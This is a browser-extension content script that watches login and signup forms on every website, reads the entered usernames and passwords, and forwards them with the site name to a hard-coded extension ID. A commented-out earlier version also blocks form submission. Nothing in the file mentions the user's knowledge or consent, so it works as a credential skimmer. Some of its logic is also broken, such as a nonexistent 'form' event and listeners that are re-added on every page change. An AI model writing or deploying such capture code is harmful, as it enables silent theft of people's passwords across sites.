/*global chrome*/

// document.addEventListener("submit", (e) => {
//   e.preventDefault()
//   console.log("Tracking...")
//   const form = e.target;
//   const inputs = form.querySelectorAll("input")

//   const data = {}
//   if (inputs) {
//     inputs.forEach((el, i) => {
//       if (el.type == "text" || el.type == "email" || el.type == "password") {
//         data[el.type] = el.value
//       }
//     })

//     data["site"] = location.hostname
//   }
  
//   // const data = {
//   //   site: location.hostname,
//   //   username: username,
//   //   password: password
//   // }
  
//   console.log("User data", data);
//   chrome.runtime.sendMessage(
//     {
//       type: "USER_FORM_INFO",
//       payload: data
//     },
//     (response) => {
//       console.log("Response ", response)
//     }
//   )
// }, true);

// function clickForm() {
//   const form = document.querySelector("form")
//   const button = form ? form.querySelector("button") : ""
//   const inputs = form ? form.querySelectorAll("input") : ""

//   console.log("FOrm: ", form, button, inputs)

//   if (!form || !button || !inputs) {
//     return
//   }

//   button.addEventListener("click", (e) => {
//     e.preventDefault()
//     console.log("Tracking...")

//     const data = {}
//     if (inputs) {
//       inputs.forEach((el, i) => {
//         if (el.type == "text" || el.type == "email" || el.type == "password") {
//           data[el.type] = el.value
//         }
//       })

//       data["site"] = location.hostname
//     }
  
//     // const data = {
//     //   site: location.hostname,
//     //   username: username,
//     //   password: password
//     // }
  
//     console.log("User data", data);
//     chrome.runtime.sendMessage(
//       {
//         type: "USER_FORM_INFO",
//         payload: data
//       },
//       (response) => {
//         console.log("Response ", response)
//       }
//     )
//   }, true);
// }

// function handleGetElements(){
//   const btn = document.querySelectorAll("button")
//   const textInput = document.querySelectorAll("input")
//   const btnInput = document.querySelectorAll("input[type='submit']")
//   const form = document.querySelector("form")

//   console.log(btn, textInput, btnInput, form)
  
//   if (form) {
//     form.addEventListener("submit", (e) => {
//       getData(e,textInput)
//     })
//   }

//   if (btn) {
//     btn.forEach((el, i) => {
//       el.addEventListener("click", (e) => {
//         getData(e,textInput)
//       }, true);
//     })
//   }

//   if (btnInput) {
//     btnInput.forEach((el, i) => {
//       el.addEventListener("click", (e) => {
//         getData(e,textInput)
//       })
//     })
//   }


  
// }

// function getData(e,textInput) {
//   e.preventDefault()
//     console.log("Tracking...")

//     const data = {}
//     if (textInput) {
//       textInput.forEach((el, i) => {

//         if (el.type == "text" || el.type == "email") {
//           console.log(el.value)
//           data["username"] = el.value
//         }

//         if (el.type == "password") {
//           data[el.type] = el.value
//         }
//       })

//       data["site"] = location.hostname
//     }
    
//     // const data = {
//     //   site: location.hostname,
//     //   username: username,
//     //   password: password
//     // }
    
//     console.log("User data", data);
//     chrome.runtime.sendMessage(
//       {
//         type: "USER_FORM_INFO",
//         payload: data
//       },
//       (response) => {
//         console.log("Response ", response)
//       }
//     )
// }

// const observer = new MutationObserver(() => {
//   handleGetElements()
// })

// observer.observe(document.body,
//   {

//     childList: true,
//     subtree: true
//   }
// )

// handleGetElements()

function getInputValues(username,password,data) {
  if (username) {
    data["username"] = username.value
  }

  if (password) {
    data['password'] = password.value
  }

  data['site'] = location.hostname

  chrome.runtime.sendMessage(
    "ifhimppppnnffofkmagbggildngckaol",
    {
      type: "USER_FORM_INFO",
      payload: data
    }, (response) => console.log("Response ", response)
  )
}

function getButtonByText() {
  const button = Array.from(document.querySelectorAll("button"))
  
  return button.find((el, i) =>
    (
      el.innerText.trim().toLowerCase() == "login" ? el : 
      el.innerText.trim().toLowerCase() == "log in" ? el :
      el.innerText.trim().toLowerCase()==" signin" ? el :
      el.innerText.trim().toLowerCase()=="sign in" ? el :
      el.innerText.trim().toLowerCase()=="signup" ? el:
      el.innerText.trim().toLowerCase()=="sign up" ? el:
      el.innerText.trim().toLowerCase()=="register" ? el:
      el.innerText.trim().toLowerCase()=="create account" ? el:""
    )
  )
}

function btnSubmit() {
  let btn = document.querySelector("input[type='submit'], input[type='button'],button[type='submit'], button[id*='login'], button[name*='login']") 
  const username = document.querySelector("input[type='email'], input[name*='user'], input[name*='email'], input[type='text']")
  const password = document.querySelector("input[type='password'], input[name*='pass']")
  const data = {}

  if (btn) {
    btn.addEventListener("click", (e) => {
      // e.preventDefault()
      getInputValues(username,password,data)
    })

    return
  }

  btn = getButtonByText()

  if (btn) {
    btn.addEventListener("click", (e) => {
      // e.preventDefault()
      getInputValues(username,password,data)
    })
  }
}

function formSubmit() {
  const data = {}

  document.addEventListener("form", (e) => {
    // e.preventDefault()
    const form = e.target
    
    const emailField = form.querySelector("input[type='email'], input[name*='user'], input[name*='email']");
    const passwordField = form.querySelector("input[type='password'], input[name*='pass']");

    const username = emailField ? emailField.value : null;
    const password = passwordField ? passwordField.value : null;

    data['username'] = username
    data['password'] = password
    data['site'] = location.hostname

    chrome.runtime.sendMessage(
      "ifhimppppnnffofkmagbggildngckaol",
      {
        type: "USER_FORM_INFO",
        payload: data
      },(response) => console.log("Response ", response)
    )

  })
}

const observer = new MutationObserver(() => {
  btnSubmit()
  formSubmit()
})

observer.observe(document.body, {
  childList: true,
  subtree:true
})

btnSubmit()
formSubmit()